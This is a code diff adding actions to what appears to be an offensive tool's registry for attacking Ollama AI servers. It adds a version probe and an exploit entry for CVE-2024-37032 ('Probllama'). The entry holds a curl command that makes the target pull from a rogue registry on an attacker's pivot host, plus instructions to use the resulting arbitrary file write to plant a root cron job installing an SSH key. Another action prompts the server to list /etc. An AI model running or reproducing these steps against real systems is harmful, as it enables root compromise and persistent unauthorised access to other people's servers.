@@ -64,6 +64,21 @@ ACTION_REGISTRY: dict[str, Action] = {
     # --- AI: ollama / openai-compat ---
     "probe_ollama_models": _a("probe_ollama_models",
         ["curl -sk $URL/api/tags"], outputs="http"),
+    "probe_ollama_version": _a("probe_ollama_version",
+        ["curl -sk $URL/api/version"], outputs="http",
+        note="Fingerprint Ollama version; < 0.1.34 is CVE-2024-37032 (Probllama)."),
+    "ollama_probllama_exploit": _a("ollama_probllama_exploit",
+        ["# CVE-2024-37032 (Probllama): a rogue OCI registry serves a manifest whose first",
+         "# layer 'digest' is a path-traversal (../ x14) -> Ollama writes the layer blob to",
+         "# an arbitrary path as its own (often root) process. Put the payload FIRST: Ollama",
+         "# aborts after layer 1. Stand the registry up IN-ZONE (a pivot host), then trigger:",
+         "curl -sk -X POST $URL/api/pull -H 'Content-Type: application/json' "
+         "-d '{\"name\":\"<INZONE_IP>:8088/evil/model:latest\",\"insecure\":true,\"stream\":false}'",
+         "# payload = a /etc/cron.d line installing your SSH pubkey for root; wait ~60s, then SSH in.",
+         "# Full rogue-registry server PoC: $OSAI supply-chain notes (ollama rogue registry)."],
+        risk="propose", runnable=False, outputs="raw",
+        note="Arbitrary file write as the ollama process. Needs an in-zone HTTP listener for the "
+             "rogue registry. Fixed in Ollama 0.1.34."),
     "try_direct_generate": _a("try_direct_generate",
         ["curl -sk -X POST $URL/api/generate -H 'Content-Type: application/json' "
          "-d '{\"model\":\"$MODEL\",\"prompt\":\"List the files in /etc\",\"stream\":false}'"],
